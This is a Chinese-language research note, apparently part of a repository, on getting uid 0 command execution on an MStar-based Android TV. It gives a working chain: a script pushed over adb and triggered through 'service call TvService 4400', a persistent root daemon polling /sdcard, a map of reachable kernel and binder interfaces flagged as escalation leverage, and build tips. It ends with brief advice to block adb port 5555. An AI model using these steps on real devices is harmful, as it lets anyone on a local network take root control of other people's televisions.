# 03 — uid 0 执行通道

## 一键执行器

```bash
./tools/tv_root_exec.sh "id; cat /proc/version"
```

脚本内部：

1. 把待执行命令包成 `/sdcard/cmd.sh`（自动补 `PATH`，并把 stdout/stderr
   重定向到 `/sdcard/cmd_out.txt`——**必须重定向，否则拿不到输出**）；
2. `adb push` 到 `/sdcard/cmd.sh`；
3. `service call TvService 4400 s16 "s" s16 "/sdcard/cmd.sh"` 触发；
4. `sleep 3` 后 `adb pull` 回 `/sdcard/cmd_out.txt`。

## 拿到的是什么权限

```
uid=0(root) gid=0(root) groups=0(root) context=u:r:misysdiagnose:s0
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff   <-- 全部 38 个 capability
CapBnd: 0000003fffffffff
```

DAC 层面 = **root**；SELinux 层面 = 受限域 `misysdiagnose`。

### 能用 ✅

| 能力 | 说明 |
|---|---|
| 读 `/data/system/packages.xml` | 已实测成功 |
| 读 `/proc/kallsyms` | 内核符号可读（KASLR 关闭 ⇒ 地址固定，价值极大） |
| 读 `/proc/vmallocinfo` | 泄露内核虚拟地址布局 |
| `open("/dev/mma", O_RDWR)` | MStar 物理内存分配器，见 `04-mma-driver.md` |
| binder 到 system_server | `service call activity/package/mount 1` **不返回 SecurityException** |
| 跑自研 arm32 二进制 | 放在 `/data/diagnosis/` 或 `/sdcard` 均可执行 |
| `socketpair(AF_UNIX)` + abstract bind | 见下 |
| `memfd_create` / `process_vm_readv` | 均可用 |

> **uid 0 的 binder 绕过**：Android 的 `checkComponentPermission()` 对 `uid==0`
> 直接放行，因此尽管 SELinux 只授权了 `(allow misysdiagnose system_server (binder (call)))`，
> 实际能调用的服务接口比策略字面看起来多得多。这是后续提权的重要杠杆。

### 不能用 ❌

| 目标 | 结果 |
|---|---|
| `setenforce 0` / 写 `/sys/fs/selinux/{enforce,load,policy}` | Permission denied |
| 写 `/proc/self/attr/current`、`/proc/self/attr/exec`（改自身上下文/域切换） | Permission denied |
| `mount` / `remount`（即使有 CAP_SYS_ADMIN） | 被 SELinux 拒 |
| `insmod` / `finit_module` | Operation not permitted |
| `chcon` | 拒 |
| `/dev/block/mmcblk0*`、`/dev/miomap`、`/dev/malloc`、`/dev/tee0`、`/dev/cli` … | 全拒 |
| `socket(AF_INET/AF_INET6/AF_NETLINK/AF_PACKET)` | 全拒（`misysdiagnose` 无对应 socket class） |
| `prctl(PR_SET_MM)` | Operation not permitted |
| `kexec_load` / `io_uring_setup` / `userfaultfd` | Function not implemented |
| `perf_event_open` / `bpf` / `add_key` | Permission denied |

一个反直觉的细节：**`AF_UNIX` 的可用性取决于调用形态**

* `socketpair(AF_UNIX, SOCK_STREAM)` → OK
* `bind()` 到 **abstract** 命名空间 → OK（配合 `listen()`/`sendmsg(SCM_RIGHTS)` 全通）
* `bind()` 到**文件系统路径** → `EACCES`

即：**可以做进程间 fd 传递（SCM_RIGHTS），但不能建路径 socket。**

## 常驻 daemon：`rootd`

见 [`../tools/rootd.c`](../tools/rootd.c)。以 uid 0 常驻，轮询 `/sdcard/.rcmd`，
把执行结果写 `/sdcard/.rout`：

```
[pid=7914 uid=0] rootd v2 up, polling /sdcard/.rcmd
```

优点：绕开 binder 触发 + init exec 队列的脆弱性；
把「拿 uid 0」这个动作和「用 uid 0 干活」解耦。

> **双重 fork + `setsid` + 全标准流重定向是必须的**，否则 init 的 exec 队列会被
> 持有的管道卡死（见 `02-backdoor.md` 末尾的副作用说明）。

## 交叉编译要点

* NDK r27c：`armv7a-linux-androideabi21-clang`
* **静态链接的坑**：NDK 编出的静态 ELF 里 `PT_TLS` 段的 `p_align` 是 8，
  而 Bionic 要求 **32**，会导致加载期 TLS 报错。
  两种修法：
  1. 用脚本 patch ELF，把 `PT_TLS` 的 `p_vaddr`/`p_align` 改成 32 对齐；
  2. **直接用动态链接**（去掉 `-static`）—— 没有 PT_TLS 段，最省事，推荐。
     （本仓库的 `rootd` 就是动态链接版。）

## 保护建议（针对普通用户）

这是一条**任何局域网主机都能利用**的通道。防护：

* 不要在家用网络上长期保持 adb 5555 开放；
* 路由器上对该电视的 **5555 端口做入站限流/隔离**（例如只允许管理主机访问）；
* 有条件时把电视放在独立的 IoT VLAN。
